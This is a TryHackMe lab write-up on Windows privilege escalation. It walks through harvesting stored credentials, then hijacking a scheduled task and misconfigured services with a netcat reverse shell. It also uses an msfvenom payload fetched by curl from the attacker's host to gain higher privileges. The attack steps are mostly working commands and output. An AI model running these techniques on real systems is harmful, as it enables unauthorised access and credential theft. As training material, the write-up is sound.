# Room Information

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Banner%20-%20Windows%20Privilege%20Escalation.png)

Room link: https://tryhackme.com/room/windowsprivesc20

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 08/11/2023

# Room Tasks

## Harvesting Passwords From Usual Spots

### PowerShell History
1. Started up this task's machine
2. `type %userprofile%\<ConsoleHost_history.txt FILE LOCATION>` from our compromised Windows machine to display the the contents of our current user's `ConsoleHost_history.txt` file, which revealed to us the password for the julia.jones user since this file contains the user's PowerShell commands history
```PowerShell
C:\Users\thm-unpriv>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
ls
whoami
whoami /priv
whoami /group
whoami /groups
cmdkey /?
cmdkey /add:thmdc.local /user:julia.jones /pass:ZuperCkretPa5z
cmdkey /list
cmdkey /delete:thmdc.local
cmdkey /list
runas /?
```

### Internet Information services (IIS) Configuration
1. Started up this task's machine
2. `type <IIS WEB CONFIGURATION FILE LOCATION> | findstr connectionString` from our compromised Windows machine to display the lines of Internet Information Services (IIS) `web.config` file containing the string "connectionString" onto our terminal, which revealed to us the set of credentials for the "db_admin" user since this configuration file usually store passwords for databases or configured authentication mechanisms
```PowerShell
C:\Users\thm-unpriv>type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
                <add connectionStringName="LocalSqlServer" maxEventDetailsLength="1073741823" buffer="false" bufferMode="Notification" name="SqlWebEventProvider" type="System.Web.Management.SqlWebEventProvider,System.Web,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a" />
                    <add connectionStringName="LocalSqlServer" name="AspNetSqlPersonalizationProvider" type="System.Web.UI.WebControls.WebParts.SqlPersonalizationProvider, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
    <connectionStrings>
        <add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />
    </connectionStrings>
```

### Saved Windows Credentials
1. Started up this task's machine
2. `cmdkey /list` from the compromised Windows machine to display a list of all credentials that are currently saved on the local machine, which revealed another user's username
```PowerShell
C:\Users\thm-unpriv>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=WPRIVESC1\mike.katz
    Type: Domain Password
    User: WPRIVESC1\mike.katz
```

3. `runas /savedcred /user:<USER> <COMMAND>` from our compromised Windows machine to run a command and open up a terminal as the user that we just previously discovered using their credentials that are already stored on the local system
```PowerShell
C:\Users\thm-unpriv>runas /savecred /user:mike.katz cmd.exe
Attempting to start cmd.exe as user "WPRIVESC1\mike.katz" ...
```
```PowerShell
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

4. `cd <ROOT DIRECTORY>` from the previously opened terminal on our compromised Windows machine to change to the machine's root directory 
```PowerShell
C:\Windows\system32>cd C:\
```

5. `dir /s <FILENAME>` from the previously opened terminal on our compromised Windows machine in order to recursively search through the machine's filesystem for the file containing this task's flag, which ended up finding and displaying its location onto our terminal
```PowerShell
C:\>dir /s flag.txt
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\mike.katz\Desktop

05/04/2022  05:17 AM                24 flag.txt
               1 File(s)             24 bytes

     Total Files Listed:
               1 File(s)             24 bytes
               0 Dir(s)  14,781,849,600 bytes free
```

6. `type <FILE PATH>` from the previously opened terminal on our compromised Windows machine to display this task's flag 
```PowerShell
C:\>type C:\Users\mike.katz\Desktop\flag.txt
THM{WHAT_IS_MY_PASSWORD}
```

### Retrieve Credentials from PuTTY
1. Started up this task's machine
2. `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s` from the compromised Windows machine to retrieve the stored proxy credentials that are saved in the current PuTTY session under our current user's profile, which revealed to us the password for the thom.smith user
```PowerShell
C:\Users\thm-unpriv>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\My%20ssh%20server
    ProxyExcludeList    REG_SZ
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x0
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    thom.smith
    ProxyPassword    REG_SZ    CoolPass2021
    ProxyTelnetCommand    REG_SZ    connect %host %port\n
    ProxyLogToTerm    REG_DWORD    0x1

End of search: 10 match(es) found.
```

## Other Quick Wins

1. Started this task's machine
2. `schtasks /query /tn <TASK NAME> /fo list /v` from the compromised Windows machine to query our target task's information and verbosely output the received data in a list format
```PowerShell
C:\Users\thm-unpriv>schtasks /query /tn vulntask /fo list /v

Folder: \
HostName:                             WPRIVESC1
TaskName:                             \vulntask
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/21/2023 10:25:35 PM
Last Result:                          0
Author:                               WPRIVESC1\Administrator
Task To Run:                          C:\tasks\schtask.bat
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          taskusr1
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A
```

3. `icacls <BINARY FILE PATH>` from the compromised Windows machine to view the DACLs (Discretionary Access Control Lists) for our target task's "Task To Run" executable, which revealed that the BUILTIN\Users group has I (`Inheritable Permissions`) and F (`Full Access`) permissions to this file
```PowerShell
C:\Users\thm-unpriv>icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat BUILTIN\Users:(I)(F)
                     NT AUTHORITY\SYSTEM:(I)(F)
                     BUILTIN\Administrators:(I)(F)

Successfully processed 1 files; Failed processing 0 files
```

4. `echo <NETCAT EXECUTABLE PATH> -e cmd.exe <ATTACK MACHINE IP> <PORT NUMBER> > <BINARY FILE PATH>` to append a netcat command that will connect back to a reverse shell listener that we'll set up on our Linux attack machine, to the target task's "Task To Run" executable
```PowerShell
C:\Users\thm-unpriv>echo c:\tools\nc64.exe -e cmd.exe 10.10.161.55 9999 > C:\tasks\schtask.bat
```

5. `nc -lvnp <PORT NUMBER` from our Linux attack machine, we'll open up a netcat listener that'll listen for any inbound connection
```Bash
root@ip-10-10-161-55:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```

6. `schtasks /run /tn <TASK NAME>` from the compromised Windows machine to run our target task, which should end up executing the netcat command that we appended onto the task's executable file and spawning a reverse shell that connects back to our netcat listener that we had previously set up on our Linux attack machine
```PowerShell
C:\Users\thm-unpriv>schtasks /run /tn vulntask
SUCCESS: Attempted to run the scheduled task "vulntask".
```
```Bash
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.193.168 49866 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

7. `cd <ROOT DIRECTORY` from our reverse shell to change to the compromised Windows machine's root directory, from where we'll look for the text file containing this task's flag
```PowerShell
C:\Windows\system32>cd C:\
cd C:\
```

8. `dir /s <FILENAME>` from our reverse shell to recursively search for the text file containing this task's flag
```PowerShell
C:\>dir /s flag.txt
dir /s flag.txt
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\taskusr1\Desktop

05/03/2022  01:00 PM                19 flag.txt
               1 File(s)             19 bytes

     Total Files Listed:
               1 File(s)             19 bytes
               0 Dir(s)  15,037,288,448 bytes free
```

9. `cat <FILE LOCATION>` from our reverse shell to display the contents of the text file containing this task's flag
```PowerShell
C:\>type C:\Users\taskusr1\Desktop\flag.txt
type C:\Users\taskusr1\Desktop\flag.txt
THM{TASK_COMPLETED}
```


**TASK COMPLETED!**

## Abusing Service Misconfigurations

### Insecure Permissions on Service Executable

1. Started this task's machine
2. `sc qc <SERVICE>` from the compromised Windows machine to query our target service's query configuration options
```PowerShell
C:\Users\thm-unpriv>sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: WindowsScheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr1
```

3. `icacls <FILENAME>` from the compromised Windows machine to display the security permissions and ACLs (Access Control Lists) for our target service's `BINARY_PATH_NAME` executable, which revealed that users in the "Everyone" group has I (`Inheritable Permissions`) and M (`Modify Permissions`) permissions for this executable file
```PowerShell
C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

4. `msfvenom -p <PAYLOAD> LHOST=<ATTACKER IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <OUTPUT FILE>` from our attack machine to generate a custom reverse shell payload executable (.exe)
```Bash
root@ip-10-10-6-207:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.6.207 LPORT=9999 -f exe-service -o ReverseShell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: ReverseShell.exe
```

5. `python3 -m <MODULE>` from our attack machine to start a simple HTTP server on our local machine using Python 3's built in HTTP server module (`http.server`)
```Bash
root@ip-10-10-6-207:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

6. `curl <ATTACK MACHINE HTTP SERVER>:<PAYLOAD FILE PATH> -O <OUTPUT FILE>` from the compromised Windows machine to make an HTTP request to our previously set up Python server on our attack machine to download our previously generated reverse shell payload executable onto the compromised machine
```PowerShell
C:\Users\thm-unpriv>curl http://10.10.6.207:8000/ReverseShell.exe -O ReverseShell.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 48640  100 48640    0     0  48640      0  0:00:01 --:--:--  0:00:01  766k
curl: (6) Could not resolve host: ReverseShell.exe
```

7. `cd <BINARY_PATH_NAME LOCATION>` from the compromised Windows machine to change into the directory where the `BINARY_PATH_NAME` executable is located in
```PowerShell
C:\Users\thm-unpriv>cd C:\PROGRA~2\SYSTEM~1
```

8. `dir` from the compromised Windows machine to display all the files and directories that are in our current working directory to ensure that the payload was successfully downloaded, which it was
```PowerShell
C:\PROGRA~2\SYSTEM~1>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\PROGRA~2\SYSTEM~1

[...]
03/25/2018  10:58 AM            98,720 WService.exe
[...]
              38 File(s)     11,144,869 bytes
               3 Dir(s)  14,788,710,400 bytes free
```

9. `move <PAYLOAD> <FILENAME>` from the compromised Windows machine to rename our target service's `BINARY_PATH_NAME` into a backup file
```PowerShell
C:\PROGRA~2\SYSTEM~1>move WService.exe WService.exe.bkp
        1 file(s) moved.
```

9. `dir` from the compromised Windows machine to display the files and directories that are in our current working directory to ensure that the executable was renamed
```PowerShell
C:\PROGRA~2\SYSTEM~1>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\PROGRA~2\SYSTEM~1

[...]
03/25/2018  10:58 AM            98,720 WService.exe.bkp
[...]
              38 File(s)     11,144,869 bytes
               3 Dir(s)  14,779,236,352 bytes free
```

10. `move <PAYLOAD> <BINARY_PATH_NAME TARGET EXECUTABLE>` from the compromised Windows machine to move our previously downloaded reverse shell payload executable into our current working directory to replace the previous `BINARY_PATH_NAME` executable with our payload
```PowerShell
C:\PROGRA~2\SYSTEM~1>move C:\Users\thm-unpriv\ReverseShell.exe WService.exe
        1 file(s) moved.
```

11. `dir` from the compromised Windows machine to list the files and directories that are in our current working directory to ensure that our payload was successfully transfered and renamed to match the `BINARY_PATH_NAME`'s executable, which it did
```PowerShell
C:\PROGRA~2\SYSTEM~1>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\PROGRA~2\SYSTEM~1

[...]
08/04/2023  03:56 PM            48,640 WService.exe
03/25/2018  10:58 AM            98,720 WService.exe.bkp
[...]
              39 File(s)     11,193,573 bytes
               3 Dir(s)  14,755,926,016 bytes free
```

12. `icacls <PAYLOAD> /grant Everyone:F` from the compromised Windows machine to grant full control (read, write, and execute permissions) to the "Everyone" group for our payload
```PowerShell
C:\PROGRA~2\SYSTEM~1>icacls WService.exe /grant Everyone:F
processed file: WService.exe
Successfully processed 1 files; Failed processing 0 files
```

13. `nc -lvnp <PORT NUMBER>` from our attack machine to open up a netcat listener using the open port that we specified in our payload that'll listen for any inbound connection
```Bash
root@ip-10-10-6-207:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```

14. `sc stop <SERVICE>` from the compromised Windows machine to stop our target service 
```PowerShell
C:\PROGRA~2\SYSTEM~1>sc stop WindowsScheduler

SERVICE_NAME: WindowsScheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3508
        FLAGS              :
```

15. `sc start <SERVICE>` from the compromised Windows machine to start our target service once again but this time its going to execute our reverse shell payload that'll spawn in a reverse shell that'll connect back to our netcat listener on our attack machine
```PowerShell
C:\PROGRA~2\SYSTEM~1>sc start WindowsScheduler

SERVICE_NAME: WindowsScheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3508
        FLAGS              :
```
```Bash
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.124.176 49783 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

16. `type <FLAG LOCATION>` on our reverse shell to type out the contents of the file containing this task's flag onto our terminal
```PowerShell
C:\Windows\system32>type C:\Users\svcusr1\Desktop\flag.txt     
type C:\Users\svcusr1\Desktop\flag.txt
THM{AT_YOUR_SERVICE}
```

**TASK COMPLETED!**

### Unquoted Service Paths

1. Started this task's machine
2. `sc qc <SERVICE>` from the comrpomised Windows machine to query the configuration of our target service, which was "disk sorter enterprise" because after executing this command, we saw that its `BINARY_PATH_NAME` had an unquoted service path, meaning that its associated executable wasn't properly quoted to account for spaces on the command
```PowerShell
C:\Users\thm-unpriv>sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\Disk.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
```

3. `icacls <TARGET DIRECTORY>` from the compromised Windows machine to display the security permissions and ACLs (Access Control Lists) for our target directory, which is one of the directories where most of service executables are installed under by default (`C:\Program Files` or `C:\Program Files (x86)`)
```PowerShell
C:\Users\thm-unpriv>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

4. `msfvenom -p <PAYLOAD> LHOST=<ATTACKER IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <OUTPUT FILE>` from our attack machine to generate a custom reverse shell payload executable (.exe)
```Bash
root@ip-10-10-6-207:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.6.207 LPORT=9999 -f exe-service -o ReverseShell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: ReverseShell.exe
```

5. `python3 -m <MODULE>` from our attack machine to start a simple HTTP server on our local machine using Python 3's built in HTTP server module (`http.server`)
```Bash
root@ip-10-10-6-207:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

6. `curl <ATTACK MACHINE HTTP SERVER>:<PAYLOAD FILE PATH> -O <OUTPUT FILE>` from the compromised Windows machine to make an HTTP request to our previously set up Python server on our attack machine to download our previously generated reverse shell payload executable onto the compromised machine
```PowerShell
C:\Users\thm-unpriv>curl http://10.10.6.207:8000/ReverseShell.exe -O ReverseShell.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 48640  100 48640    0     0  48640      0  0:00:01 --:--:--  0:00:01 1484k
curl: (6) Could not resolve host: ReverseShell.exe
```

7. `move <PAYLOAD> <BINARY_PATH_NAME EXECUTABLE>` from the compromised Windows machine to replace our target service's `BIANRY_PATH_NAME`'s executable file with our payload
```PowerShell
C:\Users\thm-unpriv>move C:\Users\thm-unpriv\ReverseShell.exe C:\MyPrograms\Disk.exe
        1 file(s) moved.
```

8. `icacls <BINARY_PATH_NAME EXECUTABLE> /grant Everyone:F` from the compromised Windows machine to grant all users in the "Everyone" group full access (read, write, and execute) permissions to our payload
```PowerShell
C:\Users\thm-unpriv>icacls C:\MyPrograms\Disk.exe /grant Everyone:F
processed file: C:\MyPrograms\Disk.exe
Successfully processed 1 files; Failed processing 0 files
```

9. `nc -lvnp <PORT NUMBER>` from our attack machine to open up a netcat listener that'll listen for any inbound connection
```Bash
root@ip-10-10-6-207:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```

10. `sc stop <SERVICE>` from the compromised Windows machine to stop our target service
```Powershell
C:\Users\thm-unpriv>sc stop "disk sorter enterprise"

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

11. `sc start <SERVICE>` from the compromised Windows machine to start up our target service once again, but this time it'll end up executing our reverse shell payload that we used to replaced its original executable with and spawning a reverse shell that connected back to our netcat listener on our attack machine
```PowerShell
C:\Users\thm-unpriv>sc start "disk sorter enterprise"

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 936
        FLAGS              :
```
```Bash
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.165.129 49761 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

12. `type <FILENAME>` from the reverse shell to display the contents of the file containing this task's flag
```PowerShell
C:\Windows\system32>type C:\Users\svcusr2\Desktop\flag.txt
type C:\Users\svcusr2\Desktop\flag.txt
THM{QUOTES_EVERYWHERE}
```


**TASK COMPLETED!**

### Insecure Service Permissions

1. Started this task's machine
2. `<Accesschk EXECUTABLE LOCATION> -qlc <SERVICE>` from the compromised Windows machine to use the [Accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) executable, which is a command-line utility developed by Microsoft Sysinternals, to view the security descriptors and permissions on our target service, which revealed that the BUILTIN\Users groups has the `SERVICE_ALL_ACCESS` permissions, meaning that any user can reconfigure the service
```PowerShell
C:\Users\thm-unpriv>C:\tools\AccessChk\accesschk64.exe -qlc thmservice

Accesschk v6.14 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

thmservice
  DESCRIPTOR FLAGS:
      [SE_DACL_PRESENT]
      [SE_SACL_PRESENT]
      [SE_SELF_RELATIVE]
  OWNER: NT AUTHORITY\SYSTEM
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [1] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  [2] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\INTERACTIVE
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [3] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SERVICE
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```

3. `msfvenom -p <PAYLOAD> LHOST=<ATTACKER IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <OUTPUT FILE>` from our attack machine to generate a custom reverse shell payload executable (.exe)
```Bash
root@ip-10-10-6-207:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.6.207 LPORT=9999 -f exe-service -o ReverseShell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: ReverseShell.exe
```

4. `python3 -m <MODULE>` from our attack machine to start a simple HTTP server on our local machine using Python 3's built in HTTP server module (`http.server`)
```Bash
root@ip-10-10-6-207:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

5. `curl <ATTACK MACHINE HTTP SERVER>:<PAYLOAD FILE PATH> -O <OUTPUT FILE>` from the compromised Windows machine to make an HTTP request to our previously set up Python server on our attack machine to download our previously generated reverse shell payload executable onto the compromised machine
```PowerShell
C:\Users\thm-unpriv>curl http://10.10.6.207:8000/ReverseShell.exe -O ReverseShell.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 48640  100 48640    0     0  48640      0  0:00:01 --:--:--  0:00:01 1532k
curl: (6) Could not resolve host: ReverseShell.exe
```

6. `icacls <PAYLOAD> /grant Everyone:F` from the compromised Windows machine to grant full control (read, write, and execute permissions) to the "Everyone" group for our payload
```PowerShell
C:\Users\thm-unpriv>icacls C:\Users\thm-unpriv\ReverseShell.exe /grant Everyone:F
processed file: C:\Users\thm-unpriv\ReverseShell.exe
Successfully processed 1 files; Failed processing 0 files
```

7. `sc config <SERVICE> binPath= "<BINARY PATH>" obj= <SERVICE ACCOUNT>` from the compromised Windows machine 
```PowerShell
C:\Users\thm-unpriv>sc config THMService binPath= "C:\Users\thm-unpriv\ReverseShell.exe" obj= LocalSystem
[SC] ChangeServiceConfig SUCCESS
```

8. 
```Bash
root@ip-10-10-6-207:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```

9. 
```PowerShell
C:\Users\thm-unpriv>sc stop THMService
[SC] ControlService FAILED 1062:

The service has not been started.
```

10. 
```PowerShell
C:\Users\thm-unpriv>sc start THMService

SERVICE_NAME: THMService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 3884
        FLAGS              :
```
```Bash
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.165.129 49902 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

11. 
```PowerShell
C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt
type C:\Users\Administrator\Desktop\flag.txt
THM{INSECURE_SVC_CONFIG}
```


## Abusing Dangerous Privileges


## Abusing Vulnerable Software


## Tools of the Trade


